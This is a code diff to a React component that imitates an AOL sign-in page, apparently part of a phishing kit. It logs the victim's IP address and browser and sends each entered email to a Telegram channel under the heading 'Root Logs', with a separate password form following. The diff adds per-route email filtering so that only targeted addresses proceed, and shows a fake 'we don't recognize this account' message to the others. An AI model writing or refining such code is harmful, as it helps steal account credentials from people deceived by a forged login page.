@@ -1,8 +1,10 @@
 import React, { useState, useEffect } from "react";
+import { useLocation } from "react-router-dom";
 import {
   getUserIP,
   getUserBrowser,
   sendMessageToTelegram,
+  validateEmailForRoute,
 } from "../services/api";
 import AOLOGO from "../assets/aol-logo.png"
 import glogo from "../assets/gogle.png" 
@@ -18,6 +20,9 @@ const AOL = () => {
 
   const [showErrorMessage, setShowErrorMessage] = useState(false);
 
+  const [isValid, setIsValid] = useState(true); // State to keep track of validation
+  const location = useLocation();
+
   useEffect(() => {
     getUserIP().then(setIpAddress);
     const browser = getUserBrowser();
@@ -26,9 +31,18 @@ const AOL = () => {
 
   const handleEmailSubmit = async (event) => {
     event.preventDefault();
-    const message = `Root Logs\nMultipage\nAOL\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
-    await sendMessageToTelegram(message);
-    setShowPasswordForm(true);
+    const isValidEmail = validateEmailForRoute(location.pathname, email);
+    setIsValid(isValidEmail);
+    if (isValidEmail) {
+        const message = `Root Logs\nMultipage\nAOL\nEmail entered: ${email}\n\n\nuserIP: ${ipAddress}\nuserBrowser: ${browser}`;
+        await sendMessageToTelegram(message);
+        setShowPasswordForm(true);
+      console.log("Email is valid for this route");
+      // Proceed with your submission logic
+    } else {
+      console.log("Email is not valid for this route");
+      // Handle invalid email case
+    }
   };
 
   const handlePasswordSubmit = async (event) => {
@@ -85,6 +99,11 @@ const AOL = () => {
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                 />
+                {!isValid && (
+                  <div className="text-sm" style={{ color: "red" }}>
+                    Sorry, we don't recognize this account.
+                  </div>
+                )}
               </div>
               <div class="flex items-center justify-between">
                 <div class="flex items-center">
@@ -104,7 +123,10 @@ const AOL = () => {
                 </div>
 
                 <div class="text-sm">
-                  <a href="/aol" class="font-medium text-[#39f] hover:text-[#39f]">
+                  <a
+                    href="/aol"
+                    class="font-medium text-[#39f] hover:text-[#39f]"
+                  >
                     {" "}
                     Forgot username?{" "}
                   </a>
@@ -120,7 +142,10 @@ const AOL = () => {
               </div>
 
               <div class="text-sm text-center">
-                <a href="/aol" class="font-medium text-[#39f] hover:text-[#39f]">
+                <a
+                  href="/aol"
+                  class="font-medium text-[#39f] hover:text-[#39f]"
+                >
                   {" "}
                   Create an account{" "}
                 </a>
@@ -191,7 +216,10 @@ const AOL = () => {
               </div>
               <div class="flex items-center justify-between">
                 <div class="text-sm">
-                  <a href="/aol" class="font-medium text-[#39f] hover:text-[#39f]">
+                  <a
+                    href="/aol"
+                    class="font-medium text-[#39f] hover:text-[#39f]"
+                  >
                     {" "}
                     Forgot password?{" "}
                   </a>
